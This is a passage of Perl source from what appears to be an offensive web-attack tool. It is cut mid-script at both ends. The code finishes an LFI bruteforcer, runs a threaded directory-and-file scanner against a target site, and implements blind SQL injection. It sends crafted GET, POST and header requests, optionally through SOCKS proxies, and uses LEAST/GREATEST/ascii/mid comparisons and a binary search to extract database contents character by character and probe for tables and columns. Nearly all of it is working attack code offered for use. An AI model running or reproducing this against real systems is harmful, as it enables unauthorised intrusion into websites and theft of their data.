$host = $host2;
$content = scan_url();
$lrl_flag = 1;
if($content =~ m/$lrl_error_message/img || $content =~ m/Bad Request/img || $content =~ m/Parse error/img) {
$lrl_flag = 0;
}
if ($lrl_flag == 1) {
print " ---> " . $current2 . "\n";
print FILE1 "------------------------------------\n";
print FILE1 " $current2\n";
print FILE1 "------------------------------------\n";
print FILE1 " " . $current . "\n";
print FILE2 "\n\n\n====================================\n";
print FILE2 " /" . $current2 . "\n";
print FILE2 "====================================\n";
print FILE2 $content . "\n";
}
print $num . "\r";
sleep $pause;
}
}
print "-------------------------------------------------------------------------------\n";
print "Saved in " . "z_" . $host2 . ".txt and CONTENT in z_" . $host2 . "_CONTENT.txt\n";
close(FILE1);
close(FILE2);
goto START3;
}
}
if ($choice == 7) {goto START_global}
}
## End LFI bruter
################################################## ################################################## ##########
## Scan site for folders & files mode ##
if ($choice == 9) {
START2:
if ($scan_url =~ m/^https:\/\/?([^\/]+)/i) {
$host1 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}
$host = $host1;
if ($https_mode_auth == 1 && $https_auth_check == 0 && $https_flag == 1) {
print "-----------------------------------------\n";
print "Authorization required, wait please....";
my $answ1 = req($host, $https_auth_script_path, 'POST', $https_auth_post_data, 0);
$ck1 = collect($answ1);
$https_auth_check = 1;
print " DONE\n";
print "-----------------------------------------\n";
}
if ($use_socks == 1 && $socks_check == 0) {
$check_url = $host;
our $query = "GET / HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: http://" . $check_url . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Ubuntu/9.04 (jaunty) Shiretoko/3.5.1\r\n"
. "Connection: close\r\n\r\n";
print "----------------------------------------\n";
print "You choose mode with SOCKS, try to find good in $socks_file ...\n";
print "Timeout = 5 sec:\n";
print "----------------------------------------\n";
$socks_check = 0;
$check_socks = socks_check();
($current_proxy_host,$current_proxy_port,$socks_ty pe) = split(/:/,$check_socks);
$proxy_message = "$current_proxy_host:$current_proxy_port, SOCKS" . $socks_type;
if ($current_proxy_host) {
$socks_check = 1;
print "Will use --> $proxy_message\n";
} else {
$socks_check = 0;
$proxy_message = "No";
print "No good SOCKS in " . $socks_file . ", change mode. Exit...\n";
}
}
print "----------------------------------\n";
print "Scan site for folders & files mode\n";

print "----------------------------------\n";
print " [1] Start scan\n";
print " [2] Main menu\n";
print "----------------------------------\n";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
open( FILE1, ">>" . "z_" .$host1 . ".txt" ); # ???? ??? ?????? ???????????
print FILE1 "----------------------------------\n";
print FILE1 "Scan site for folders & files mode\n";
print FILE1 "----------------------------------\n";
print "Scan URL: $scan_url\n";
open(FILE, "<", $error_list);
while(<FILE>) {
chomp;
push(@error, $_);
}
close(FILE);
$size = 0;
$size = @error;
open(FILE2, "<", $folder_list);
while(<FILE2>) {
chomp;
push(@folder, $_);
}
close(FILE2);
$size1 = 0;
$size1 = @folder;
print "---------------------------------\n";
print "File with errors: $error_list\n";
print "File with folders: $folder_list\n";
print "Folders: $size1\n";
print "---------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets8);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets8 {
$| = 1;
while ($num<$size1) {
{ lock($num);
$num++; }
$current1 = $folder[$num];
$uri = $scan_url . "/" . $current1;
$current = $uri;
$host = $host1;
$content = scan_url();
$i = 0;
$flag = 1;
while ($i<$size) {
if($content =~ m/$error[$i]/img) {$flag = 0}
$i++;
}
if ($flag == 1) {
print " ---> " . $uri . "\n";
print FILE1 " - " . $uri . "\n";
}
print $num . "\r";
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host1 . ".txt\n";
close(FILE1);
goto START2;

}
if ($choice == 2) {
goto START_global;
}
}
################################################## ################################################## ##################
sub wr_check_HEADER {
$result = 0;
$host = $host3;
$current = $bl_url;
$bl_query =~ s!\Q$search!$replacement!g;
$res = "";
if($current && $bl_query){
if ($test_mode==1) {
print "===============================================\n";
print "URL: $current\n";
print "HEADER query: $bl_query\n";
}
if ($https_flag == 0) {
if ($socks_check == 0) {
if ($use_proxy == 0) {
if ($socket=IO::Socket::INET->new( PeerAddr => $host, PeerPort => 80, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
if ($sql_header) {
print $socket "$bl_query\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Content-Type: application/x-www-form-urlencoded\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
if ($bl_error_type == 1) {
if($res =~ m/$bl_error/img) {
close $socket;
$result = 1;
blind_t();
return $result;
} else {
close $socket;
blind_f();
return $result;
}
}
if ($bl_error_type == 0) {
if($res =~ m/$bl_error/img) {
blind_f();
return $result;
} else {
$result = 1;
blind_t();
return $result;
}
}
}
close $socket;
}
} else {
if ($socket=IO::Socket::INET->new( PeerAddr => $current_proxy_host, PeerPort => $current_proxy_port, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
if ($sql_header) {
print $socket "$bl_query\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Content-Type: application/x-www-form-urlencoded\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
if ($bl_error_type == 1) {
if($res =~ m/$bl_error/img) {
close $socket;
blind_t();
$result = 1;
return $result;
} else {
close $socket;
blind_f();
return $result;
}
}
if ($bl_error_type == 0) {
if($res =~ m/$bl_error/img) {
close $socket;
blind_f();
return $result;
} else {
close $socket;
blind_t();
$result = 1;
return $result;
}
}
}
close $socket;
}
}
} else {
$check_url = $current;
$check_host = $host;
if ($cookie) {
if ($sql_header) {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Cookie: $cookie\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Content-Type: application/x-www-form-urlencoded\n"
. "$bl_query\r\n" 
. "Connection: close\r\n\r\n";
} else {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Cookie: $cookie\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Connection: close\r\n\r\n";

} 
} else {
if ($sql_header) {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Content-Type: application/x-www-form-urlencoded\n"
. "$bl_query\r\n" 
. "Connection: close\r\n\r\n";
} else {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Connection: close\r\n\r\n";

} 
}
$res = socks_get();
if ($bl_error_type == 1) {
if($res =~ m/$bl_error/img) {
blind_t();
$result = 1;
return $result;
} else {
blind_f();
return $result;
}
}
if ($bl_error_type == 0) {
if($res =~ m/$bl_error/img) {
blind_f();
return $result;
} else {
blind_t();
$result = 1;
return $result;
}
}
}
} else {
$res = req($host, $current, 'GET', 0, $ck1);
if ($bl_error_type == 1) {
if($res =~ m/$bl_error/img) {
blind_t();
$result = 1;
return $result;
} else {
blind_f();
return $result;
}
}
if ($bl_error_type == 0) {
if($res =~ m/$bl_error/img) {
blind_f();
return $result;
} else {
$result = 1;
blind_t();
return $result;
}
}
}
}
}

sub wr_check_POST {
$result = 0;
$host = $host3;
$current = $bl_url;
$res = "";
if($current && $bl_query){
if ($test_mode==1) {
print "===============================================\n";
print "URL: $current\n";
print "POST query: $bl_query\n";
}
$lsd=length $bl_query;
if ($https_flag == 0) {
if ($socks_check == 0) {
if ($use_proxy == 0) {
if ($socket=IO::Socket::INET->new( PeerAddr => $host, PeerPort => 80, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Content-Type: application/x-www-form-urlencoded\n";
print $socket "Content-Length: $lsd\n";
print $socket "Connection: close\n\n";
print $socket $bl_query ."\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
if ($bl_error_type == 1) {
if($res =~ m/$bl_error/img) {
close $socket;
blind_t();
$result = 1;
return $result;
} else {
close $socket;
blind_f();
return $result;
}
}
if ($bl_error_type == 0) {
if($res =~ m/$bl_error/img) {
blind_f();
return $result;
} else {
blind_t();
$result = 1;
return $result;
}
}
}
close $socket;
}
} else {
if ($socket=IO::Socket::INET->new( PeerAddr => $current_proxy_host, PeerPort => $current_proxy_port, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Content-Type: application/x-www-form-urlencoded\n";
print $socket "Content-Length: $lsd\n";
print $socket "Connection: close\n\n";
print $socket $bl_query ."\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
if ($bl_error_type == 1) {
if($res =~ m/$bl_error/img) {
close $socket;
blind_t();
$result = 1;
return $result;
} else {
close $socket;
blind_f();
return $result;
}
}
if ($bl_error_type == 0) {
if($res =~ m/$bl_error/img) {
close $socket;
blind_f();
return $result;
} else {
close $socket;
blind_t();
$result = 1;
return $result;
}
}
}
close $socket;
}
}
} else {
$check_url = $current;
$check_host = $host;
if ($cookie) {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Cookie: $cookie\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Content-Type: application/x-www-form-urlencoded\n"
. "Content-Length: $lsd\n"
. "Connection: close\n\n"
. $bl_query ."\n";
} else {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"

. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Content-Type: application/x-www-form-urlencoded\n"
. "Content-Length: $lsd\n"
. "Connection: close\n\n"
. $bl_query ."\n";
}
$res = socks_get();
if ($bl_error_type == 1) {
if($res =~ m/$bl_error/img) {
blind_t();
$result = 1;
return $result;
} else {
blind_f();
return $result;
}
}
if ($bl_error_type == 0) {
if($res =~ m/$bl_error/img) {
blind_f();
return $result;
} else {
blind_t();
$result = 1;
return $result;
}
}
}
} else {
$res = req($host, $current, 'GET', 0, $ck1);
if ($bl_error_type == 1) {
if($res =~ m/$bl_error/img) {
blind_t();
$result = 1;
return $result;
} else {
blind_f();
return $result;
}
}
if ($bl_error_type == 0) {
if($res =~ m/$bl_error/img) {
blind_f();
return $result;
} else {
blind_t();
$result = 1;
return $result;
}
}
}
}
}
sub blind_t{
if ($test_mode==1) {
print "result: TRUE\n";
print "===============================================\n"; 
}
}
sub blind_f{
if ($test_mode==1) {
print "result: FALSE\n";
print "===============================================\n"; 
}
}
sub wr_check {
$result = 0;
$host = $host3;
$current = $bl_query;
$res = "";
if ($current && $host){
if ($test_mode==1) {
print "===============================================\n";
print "URL: $current\n";
}
if ($https_flag == 0) {
if ($socks_check == 0) {
if ($use_proxy == 0) {
if ($socket=IO::Socket::INET->new( PeerAddr => $host, PeerPort => 80, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
if ($bl_error_type == 1) {
if($res =~ m/$bl_error/img) {
close $socket;
$result = 1;
blind_t();
return $result;
} else {
close $socket;
blind_f();
return $result;
}
}
if ($bl_error_type == 0) {
if($res =~ m/$bl_error/img) {
blind_f();
return $result;
} else {
$result = 1;
blind_t();
return $result;
}
}
}
close $socket;
}
} else {
if ($socket=IO::Socket::INET->new( PeerAddr => $current_proxy_host, PeerPort => $current_proxy_port, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
if ($bl_error_type == 1) {
if($res =~ m/$bl_error/img) {
close $socket;
$result = 1;
blind_t();
return $result;
} else {
close $socket;
blind_f();
return $result;
}
}
if ($bl_error_type == 0) {
if($res =~ m/$bl_error/img) {
close $socket;
blind_f();
return $result;
} else {
close $socket;
$result = 1;
blind_t();
return $result;
}
}
}
close $socket;
}
}
} else {
$check_url = $current;
$check_host = $host;
if ($cookie) {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Cookie: $cookie\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Connection: close\r\n\r\n";
} else {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Connection: close\r\n\r\n";
}
$res = socks_get();
if ($bl_error_type == 1) {
if($res =~ m/$bl_error/img) {
$result = 1;
blind_t();
return $result;
} else {
blind_f();
return $result;
}
}
if ($bl_error_type == 0) {
if($res =~ m/$bl_error/img) {
blind_f();
return $result;
} else {
$result = 1;
blind_t();
return $result;
}
}
}
} else {
$res = req($host, $current, 'GET', 0, $ck1);
if ($bl_error_type == 1) {
if($res =~ m/$bl_error/img) {
$result = 1;
blind_t();
return $result;
} else {
blind_f();
return $result;
}
}
if ($bl_error_type == 0) {
if($res =~ m/$bl_error/img) {
blind_f();
return $result;
} else {
$result = 1;
blind_t();
return $result;
}
}
}
}
}
sub column_check {
$result = 0;
$host = $host5;
$current = $current10;
$res = "";
if ($https_flag == 0) {
if ($socks_check == 0) {
if ($use_proxy == 0) {
if ($socket=IO::Socket::INET->new( PeerAddr => $host, PeerPort => 80, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
if ($sql_mess_type == 1) {
if($res =~ m/$sql_mess/img) {
close $socket;
$result = 1;
return $result;
} else {
close $socket;
return $result;
}
}
if ($sql_mess_type == 0) {
if($res =~ m/$sql_mess/img) {
return $result;
} else {
$result = 1;
return $result;
}
}
}
close $socket;
}
} else {
if ($socket=IO::Socket::INET->new( PeerAddr => $current_proxy_host, PeerPort => $current_proxy_port, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
if ($sql_mess_type == 1) {
if($res =~ m/$sql_mess/img) {
close $socket;
$result = 1;
return $result;
} else {
close $socket;
return $result;
}
}
if ($sql_mess_type == 0) {
if($res =~ m/$sql_mess/img) {
close $socket;
return $result;
} else {
close $socket;
$result = 1;
return $result;
}
}
}
close $socket;
}
}
} else {
$check_url = $current;
$check_host = $host;
if ($cookie) {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Cookie: $cookie\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Connection: close\r\n\r\n";
} else {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Connection: close\r\n\r\n";
}
$res = socks_get();
if ($sql_mess_type == 1) {
if($res =~ m/$sql_mess/img) {
$result = 1;
return $result;
} else {
return $result;
}
}
if ($sql_mess_type == 0) {
if($res =~ m/$sql_mess/img) {
return $result;
} else {
$result = 1;
return $result;
}
}
}
} else {
$res = req($host, $current, $method, 0, $ck1);
if ($sql_mess_type == 1) {
if($res =~ m/$sql_mess/img) {
$result = 1;
return $result;
} else {
return $result;
}
}
if ($sql_mess_type == 0) {
if($res =~ m/$sql_mess/img) {
return $result;
} else {
$result = 1;
return $result;
}
}
}
}
sub a_column_check {
$result = 0;
$current = $a_current;
$host = $host10;
$global_error = $current_error;
$res = "";
if ($https_flag == 0) {
if ($socks_check == 0) {
if ($use_proxy == 0) {
if ($socket=IO::Socket::INET->new( PeerAddr => $host, PeerPort => 80, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
if($res =~ m/$global_error/imgs) {
close $socket;
$result = 1;
return $result;
} else {
close $socket;
return $result;
}
}
close $socket;
}
} else {
if ($socket=IO::Socket::INET->new( PeerAddr => $current_proxy_host, PeerPort => $current_proxy_port, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
if($res =~ m/$global_error/imgs) {
close $socket;
$result = 1;
return $result;
} else {
close $socket;
return $result;
}
}
close $socket;
}
}
} else {
$check_url = $current;
$check_host = $host;
if ($cookie) {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Cookie: $cookie\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Connection: close\r\n\r\n";
} else {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Connection: close\r\n\r\n";
}
$res = socks_get();
if($res =~ m/$global_error/imgs) {
$result = 1;
return $result;
} else {
return $result;
}
}
} else {
$res = req($host, $current, $method, 0, $ck1);
if($res =~ m/$global_error/imgs) {
$result = 1;
return $result;
} else {
return $result;
}
}
}
sub a_table_check {
$result = 0;
$current = $a_current;
$host = $host10;
$global_error = $current_error;
$res = "";
if ($https_flag == 0) {
if ($socks_check == 0) {
if ($use_proxy == 0) {
if ($socket=IO::Socket::INET->new( PeerAddr => $host, PeerPort => 80, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
if($res =~ m/$global_error/imgs || $res =~ m/Syntax error/imgs || $res =~ m/Could not find/imgs || $res =~ m/cannot find the input table/imgs || $res =~ m/Too few parameters/imgs) {
close $socket;
return $result;
} else {
close $socket;
$result = 1;
return $result;
}
}
close $socket;
}
} else {
if ($socket=IO::Socket::INET->new( PeerAddr => $current_proxy_host, PeerPort => $current_proxy_port, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
if($res =~ m/$global_error/imgs || $res =~ m/Syntax error/imgs || $res =~ m/Could not find/imgs || $res =~ m/cannot find the input table/imgs || $res =~ m/Too few parameters/imgs) {
close $socket;
return $result;
} else {
close $socket;
$result = 1;
return $result;
}
}
close $socket;
}
}
} else {
$check_url = $current;
$check_host = $host;
if ($cookie) {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Cookie: $cookie\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Connection: close\r\n\r\n";
} else {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Connection: close\r\n\r\n";
}
$res = socks_get();
if($res =~ m/$global_error/img || $res =~ m/Syntax error/imgs || $res =~ m/Could not find/imgs || $res =~ m/cannot find the input table/imgs || $res =~ m/Too few parameters/imgs) {
return $result;
} else {
$result = 1;
return $result;
}
}
} else {
$res = req($host, $current, $method, 0, $ck1);
if($res =~ m/$global_error/imgs || $res =~ m/Syntax error/imgs || $res =~ m/Could not find/imgs || $res =~ m/cannot find the input table/imgs || $res =~ m/Too few parameters/imgs) {
return $result;
} else {
$result = 1;
return $result;
}
}
}
sub len_check {
$len_len = 1;
$flag = 1;
if($sql_flag == 0) {$bbbl_url = $bl_url}
if($sql_flag == 1) {$bbbl_url = $sql_post}
if($sql_flag == 2) {$bbbl_url = $sql_header}
while($flag<4) {
#$bl_query = $bbbl_url . $bl_plus . "and" . $bl_plus . "length(length(" . $bl_current . "))>" . $len_len . $bl_filtr;
$bl_query = $bbbl_url . $bl_plus . "and(LEAST(length(length(" . $bl_current . ")),$len_len)=" . $len_len . ")" . $bl_filtr;
$current = $bl_query;
if($sql_flag == 0) {$chek_len = wr_check()}
if($sql_flag == 1) {$chek_len = wr_check_POST()}
if($sql_flag == 2) {$chek_len = wr_check_HEADER()}
$len_len++;
$flag++;
if ($chek_len == 0) {
$len_len--;
$flag = 4;
}
}
$len = '';
$i = 1;
while ($i <= $len_len) {
#$bl_query = $bbbl_url . $bl_plus . "and" . $bl_plus . "mid(length(" . $bl_current . ")," .$i. ",1)<5". $bl_filtr;
$bl_query = $bbbl_url . $bl_plus . "and(GREATEST(mid(length(" . $bl_current . ")," .$i. ",1),5)=5)". $bl_filtr;
if($sql_flag == 0) {$chek_len1 = wr_check()}
if($sql_flag == 1) {$chek_len1 = wr_check_POST()}
if($sql_flag == 2) {$chek_len1 = wr_check_HEADER()}
if($chek_len1 == 1) {
$i3 = 0;
while ($i3 < 5) {
$bl_query = $bbbl_url . $bl_plus . "and" . $bl_plus . "mid(length(" . $bl_current . ")," .$i. ",1)=" . $i3 . $bl_filtr;
if($sql_flag == 0) {$chek_len2 = wr_check()}
if($sql_flag == 1) {$chek_len2 = wr_check_POST()}
if($sql_flag == 2) {$chek_len2 = wr_check_HEADER()}
if($chek_len2 == 1) {
$len .= $i3;
break;
}
$i3++;
}
} else {
$i3 = 5;
while ($i3 <= 9) {
$bl_query = $bbbl_url . $bl_plus . "and(mid(length(" . $bl_current . ")," .$i. ",1)=" . $i3 . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len3 = wr_check()}
if($sql_flag == 1) {$chek_len3 = wr_check_POST()}
if($sql_flag == 2) {$chek_len3 = wr_check_HEADER()}
if($chek_len3 == 1) {
$len .= $i3;
break;
}
$i3++;
}
}
$i++;
}
return ($len/10);
}
sub len_check1 {
$len_len = 0;
$flag = 1;
if($sql_flag == 0) {$bbbl_url = $bl_url}
if($sql_flag == 1) {$bbbl_url = $sql_post}
if($sql_flag == 2) {$bbbl_url = $sql_header}
while($flag<4) {
#$bl_query = $bbbl_url . $bl_plus . "length(length(" . $bl_current . "))>" . $len_len . $bl_filtr;
$bl_query = $bbbl_url . $bl_plus . "(LEAST(length(length(" . $bl_current . ")),$len_len)=".$len_len . ")" . $bl_filtr; #- WORK
$current = $bl_query;
if($sql_flag == 0) {$chek_len = wr_check()}
if($sql_flag == 1) {$chek_len = wr_check_POST()}
if($sql_flag == 2) {$chek_len = wr_check_HEADER()}
$len_len++;
$flag++;
if ($chek_len == 0) {
$len_len--;
$flag = 4;
}
}
$len = '';
$i = 1;
while ($i <= $len_len) {
$bl_query = $bbbl_url . $bl_plus . "(GREATEST(mid(length(" . $bl_current . ")," .$i. ",1),5)=5)" .$bl_filtr;
if($sql_flag == 0) {$chek_len1 = wr_check()}
if($sql_flag == 1) {$chek_len1 = wr_check_POST()}
if($sql_flag == 2) {$chek_len1 = wr_check_HEADER()}
if($chek_len1 == 1) {
$i3 = 0;
while ($i3 < 5) {
$bl_query = $bbbl_url . $bl_plus . "(mid(length(" . $bl_current . ")," .$i. ",1)=" . $i3 . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len2 = wr_check()}
if($sql_flag == 1) {$chek_len2 = wr_check_POST()}
if($sql_flag == 2) {$chek_len2 = wr_check_HEADER()}
if($chek_len2 == 1) {
$len .= $i3;
break;
}
$i3++;
}
} else {
$i3 = 5;
while ($i3 <= 9) {
$bl_query = $bbbl_url . $bl_plus . "(mid(length(" . $bl_current . ")," .$i. ",1)=" . $i3 . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len3 = wr_check()}
if($sql_flag == 1) {$chek_len3 = wr_check_POST()}
if($sql_flag == 2) {$chek_len3 = wr_check_HEADER()}
if($chek_len3 == 1) {
$len .= $i3;
break;
}
$i3++;
}
}
$i++;
}
return ($len/10);
}
sub get_res {
$max = 255;
$min = 0;
$srd = 127;
if($sql_flag == 0) {$bbbl_url = $bl_url}
if($sql_flag == 1) {$bbbl_url = $sql_post}
if($sql_flag == 2) {$bbbl_url = $sql_header}
while (($max - $min)> 1) {
$bl_query = $bbbl_url . $bl_plus . "and(LEAST(ascii(mid(" . $bl_current . "," .$ii. ",1)),$srd)=" . $srd . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len4 = wr_check()}
if($sql_flag == 1) {$chek_len4 = wr_check_POST()}
if($sql_flag == 2) {$chek_len4 = wr_check_HEADER()}
if($chek_len4 == 1) {
$min = $srd + 1;
} else {
$max = $srd;
}
$srd = int(($max + $min)/2);
}
$bl_query = $bbbl_url . $bl_plus . "and(LEAST(ascii(mid(" . $bl_current . "," .$ii. ",1)),$min)=" . $min . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len5 = wr_check()}
if($sql_flag == 1) {$chek_len5 = wr_check_POST()}
if($sql_flag == 2) {$chek_len5 = wr_check_HEADER()}
if($chek_len5 == 1) {
return chr(($max-1));
} else {
